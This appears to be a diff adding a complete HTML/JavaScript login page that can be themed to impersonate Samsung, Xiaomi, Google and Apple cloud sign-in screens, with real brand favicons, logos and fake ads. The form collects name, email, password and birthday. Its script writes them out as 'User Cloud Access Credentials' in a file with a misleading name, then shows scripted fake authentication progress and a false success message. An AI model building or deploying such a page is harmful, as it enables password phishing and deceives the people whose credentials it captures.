@@ -1,0 +1,298 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign In - Cloud Services</title> 
+    <link id="favicon" rel="icon" href="favicon.ico" type="image/x-icon"> 
+    <link rel="stylesheet" href="style.css">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600&display=swap" rel="stylesheet"> 
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+</head>
+<body id="page-body">
+
+    <!-- Animated Background Element -->
+    <div class="background-animation"></div>
+
+    <!-- Theme Switcher (Moved to be a direct child of body) -->
+    <div id="theme-switcher">
+        <span id="theme-trigger"> <!-- Removed title attribute -->
+            <i class="fas fa-palette"></i>
+        </span>
+        <div id="theme-menu" class="hidden">
+            <button data-theme="default"><i class="fas fa-cloud"></i> Default Cloud</button>
+            <button data-theme="samsung"><i class="fab fa-samsung"></i> Samsung Cloud</button>
+            <button data-theme="xiaomi"><i class="fab fa-xing"></i> Xiaomi Cloud</button> 
+            <button data-theme="google"><i class="fab fa-google"></i> Google Cloud</button>
+            <button data-theme="apple"><i class="fab fa-apple"></i> Apple iCloud</button>
+        </div>
+    </div>
+
+        <div class="page-wrapper">
+        <main class="form-container login-container" id="login-section">
+            <div class="form-box">
+                <div class="form-header">
+                    <div class="logo-placeholder" id="form-logo">
+                        <i class="fas fa-cloud"></i>
+                    </div>
+                    <h1 id="form-title">Sign in to Your Cloud</h1> 
+                    <p class="subtitle" id="form-subtitle">Access your secure cloud storage.</p>
+                </div>
+
+                <form id="login-form"> 
+                    <!-- Input groups remain the same -->
+                     <div class="input-group">
+                        <label for="name"><i class="fas fa-user icon"></i> Full Name</label>
+                        <input type="text" id="name" name="name" placeholder="Your full name" required>
+                    </div>
+                    <div class="input-group">
+                         <label for="email"><i class="fas fa-envelope icon"></i> Email Address</label>
+                        <input type="email" id="email" name="email" placeholder="you@example.com" required>
+                    </div>
+                    <div class="input-group">
+                        <label for="password"><i class="fas fa-lock icon"></i> Password</label>
+                        <input type="password" id="password" name="password" placeholder="Enter your password" required>
+                    </div>
+                    <div class="input-group">
+                        <label for="birthday"><i class="fas fa-calendar-alt icon"></i> Birthday (Optional)</label>
+                        <input type="date" id="birthday" name="birthday">
+                    </div>
+                    
+                    <div class="options">
+                         <a href="#" class="link-subtle">Forgot Password?</a> 
+                    </div>
+
+                    <button type="submit" class="btn-submit">
+                        <i class="fas fa-sign-in-alt"></i> Sign In Securely
+                    </button> 
+
+                     <p class="alternate-action">
+                        Don't have an account? 
+                        <!-- Updated link -->
+                        <a href="404.html" class="link-emphasis">Create one now</a> 
+                     </p>
+                </form>
+            </div>
+
+            <!-- Fake Ad Container -->
+            <aside class="fake-ad-container" id="fake-ad-container">
+                <!-- Ad content will be injected by JS -->
+                <div class="ad-placeholder">Advertisement</div>
+            </aside>
+
+        </main>
+    </div>
+
+    <!-- Loading/Animation Overlay (Structure remains similar) -->
+    <div id="loading-overlay">
+        <div class="spinner"></div>
+        <p id="loading-text">Initializing Secure Connection...</p>
+        <p id="success-message" style="display: none;"></p>
+    </div>
+
+    <!-- JavaScript - Needs updates -->
+    <script>
+        const themeTrigger = document.getElementById('theme-trigger');
+        const themeMenu = document.getElementById('theme-menu');
+        const themeButtons = themeMenu.querySelectorAll('button[data-theme]');
+        const pageBody = document.getElementById('page-body');
+        const favicon = document.getElementById('favicon');
+        const themeSwitcher = document.getElementById('theme-switcher'); 
+        const formTitle = document.getElementById('form-title');
+        const formSubtitle = document.getElementById('form-subtitle');
+        const formLogo = document.getElementById('form-logo'); 
+        const fakeAdContainer = document.getElementById('fake-ad-container'); // Get Ad container
+
+        // Updated theme data with Ad content
+        const themeData = {
+            default: { 
+                title: "Sign In - Cloud Services", 
+                favicon: "favicon.ico", 
+                name: "Default Cloud",
+                formTitle: "Sign in to Your Cloud",
+                formSubtitle: "Access your secure cloud storage.",
+                logoHtml: '<i class="fas fa-cloud"></i>',
+                adHtml: `
+                    <h4>Secure Cloud Backup</h4>
+                    <p>Never lose a file again. Reliable storage for everyone.</p>
+                    <a href="#" class="ad-link">Learn More »</a>`
+            },
+            samsung: { 
+                title: "Samsung Cloud - Sign In", 
+                favicon: "https://static-00.iconduck.com/assets.00/samsung-internet-5-4-9-0-icon-510x512-qb0xl3wu.png", 
+                name: "Samsung Cloud",
+                formTitle: "Sign in to Samsung Cloud",
+                formSubtitle: "Your memories and data, securely stored.",
+                logoHtml: '<i class="fab fa-samsung"></i>',
+                 adHtml: `
+                    <img src="https://via.placeholder.com/80x40/0b4da1/ffffff?text=SAMSUNG" alt="Samsung Logo" class="ad-logo">
+                    <h4>Galaxy Ecosystem</h4>
+                    <p>Seamlessly connect your Samsung devices with the cloud.</p>
+                    <a href="#" class="ad-link">Discover Now »</a>`
+            },
+            xiaomi: { 
+                title: "Xiaomi Cloud - Sign In", 
+                favicon: "https://www.mi.com/favicon.ico",
+                name: "Xiaomi Cloud",
+                formTitle: "Sign in to Mi Cloud",
+                formSubtitle: "Sync your data across devices.",
+                 logoHtml: '<i class="fab fa-xing"></i>',
+                 adHtml: `
+                    <img src="https://via.placeholder.com/80x40/ff6900/ffffff?text=Mi" alt="Xiaomi Logo" class="ad-logo">
+                    <h4>Smart Living</h4>
+                    <p>Power your connected life with Mi Cloud integration.</p>
+                    <a href="#" class="ad-link">Explore Features »</a>`
+            },
+             google: { 
+                title: "Google Cloud - Sign In", 
+                favicon: "https://www.google.com/favicon.ico",
+                name: "Google Cloud",
+                 formTitle: "Sign in with Google",
+                 formSubtitle: "Access your Google Cloud services.",
+                 logoHtml: '<i class="fab fa-google"></i>',
+                 adHtml: `
+                    <img src="https://via.placeholder.com/80x40/4285F4/ffffff?text=Google" alt="Google Logo" class="ad-logo">
+                    <h4>Build What's Next</h4>
+                    <p>Leverage Google's infrastructure for your projects.</p>
+                    <a href="#" class="ad-link">Go to Console »</a>`
+            },
+            apple: { 
+                title: "Sign in to iCloud", 
+                favicon: "https://www.apple.com/favicon.ico", // Apple's actual favicon
+                name: "Apple iCloud",
+                formTitle: "Sign in to iCloud",
+                formSubtitle: "Use your Apple ID.",
+                logoHtml: '<i class="fab fa-apple"></i>', // Font Awesome Apple icon
+                 adHtml: `
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/f/fa/Apple_logo_black.svg/160px-Apple_logo_black.svg.png" alt="Apple Logo" class="ad-logo apple-ad-logo">
+                    <h4>Privacy. That’s iPhone.</h4>
+                    <p>And iCloud. Your data is yours, protected and secure.</p>
+                    <a href="#" class="ad-link">Learn about Apple Privacy »</a>`
+            }
+        };
+
+        function applyTheme(themeName) {
+            const theme = themeData[themeName] || themeData.default;
+
+            // Add class for background animation targeting
+            pageBody.className = ''; // Clear existing classes first
+            pageBody.classList.add(`theme-${themeName}-bg`); // Unique class for body background
+            if (themeName !== 'default') {
+                 // Add generic theme class if needed for other styles (like form styling)
+                pageBody.classList.add(`theme-${themeName}`); 
+            }
+
+
+            document.title = theme.title;
+            favicon.href = theme.favicon;
+            
+            formTitle.textContent = theme.formTitle;
+            formSubtitle.textContent = theme.formSubtitle;
+            formLogo.innerHTML = theme.logoHtml; 
+
+            // Update Ad Content
+            fakeAdContainer.innerHTML = theme.adHtml;
+
+            localStorage.setItem('selectedTheme', themeName);
+            themeMenu.classList.add('hidden');
+        }
+
+        // --- Event listeners (Theme switcher logic remains the same) ---
+        themeTrigger.addEventListener('click', (event) => {
+            event.stopPropagation(); 
+            themeMenu.classList.toggle('hidden');
+        });
+        themeMenu.addEventListener('click', (event) => {
+            const button = event.target.closest('button[data-theme]');
+            if (button) {
+                applyTheme(button.dataset.theme);
+            }
+        });
+        document.addEventListener('click', (event) => {
+            if (!themeSwitcher.contains(event.target)) { 
+                 themeMenu.classList.add('hidden');
+            }
+        });
+
+        // --- Load theme & Form Submit Logic ---
+        document.addEventListener('DOMContentLoaded', () => {
+            const savedTheme = localStorage.getItem('selectedTheme') || 'default';
+            applyTheme(savedTheme);
+
+            // --- Form Submission Logic (remains the same) ---
+            const loginForm = document.getElementById('login-form');
+            const loginSection = document.getElementById('login-section');
+            // ... (rest of the form submission & animation code is identical to previous version) ...
+             const loadingOverlay = document.getElementById('loading-overlay');
+            const loadingText = document.getElementById('loading-text');
+            const successMessage = document.getElementById('success-message');
+            const spinner = document.querySelector('.spinner'); 
+
+            loginForm.addEventListener('submit', function(event) {
+                event.preventDefault();
+                const formData = new FormData(loginForm);
+                let dataString = `Theme: ${localStorage.getItem('selectedTheme') || 'default'} Cloud\n`; 
+                dataString += "User Cloud Access Credentials:\n==============================\n";
+                formData.forEach((value, key) => {
+                    const formattedKey = key.charAt(0).toUpperCase() + key.slice(1); 
+                    dataString += `${formattedKey}: ${value || 'Not provided'}\n`; 
+                });
+
+                try {
+                    const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
+                    triggerDownload(dataString, `cloud_dependencies_${timestamp}.txt`);
+                } catch (error) {
+                    console.error("Download failed:", error);
+                    loadingText.textContent = "Error preparing data download."; 
+                }
+
+                // Hide form and ad container
+                loginSection.style.display = 'none'; 
+                fakeAdContainer.style.display = 'none'; // Hide ads during loading
+                themeSwitcher.style.opacity = '0'; // Hide theme switcher subtly
+                
+                loadingOverlay.classList.add('visible');
+                spinner.style.display = 'block';
+                successMessage.style.display = 'none';
+                loadingText.style.display = 'block';
+
+                const messages = [
+                    "Establishing secure channel...",
+                    "Authenticating credentials...",   
+                    "Verifying account status...",    
+                    "Accessing cloud environment..."  
+                ];
+                
+                loadingText.textContent = "Initiating connection..."; 
+
+                setTimeout(() => { loadingText.textContent = messages[0]; }, 1000); 
+                setTimeout(() => { loadingText.textContent = messages[1]; }, 4000); 
+                setTimeout(() => { loadingText.textContent = messages[2]; }, 7000); 
+                setTimeout(() => { loadingText.textContent = messages[3]; }, 10000); 
+
+                setTimeout(() => {
+                    spinner.style.display = 'none';
+                    loadingText.style.display = 'none'; 
+                    successMessage.textContent = "Authentication Successful. You can now close this page.";
+                    successMessage.style.display = 'block';
+                }, 12000); 
+            });
+
+             function triggerDownload(content, filename) {
+                const blob = new Blob([content], { type: 'text/plain;charset=utf-8' });
+                const url = URL.createObjectURL(blob);
+                const link = document.createElement('a');
+                link.href = url;
+                link.download = filename; 
+                document.body.appendChild(link); 
+                link.click();
+                document.body.removeChild(link);
+                URL.revokeObjectURL(url); 
+            }
+        });
+
+    </script>
+</body>
+</html>
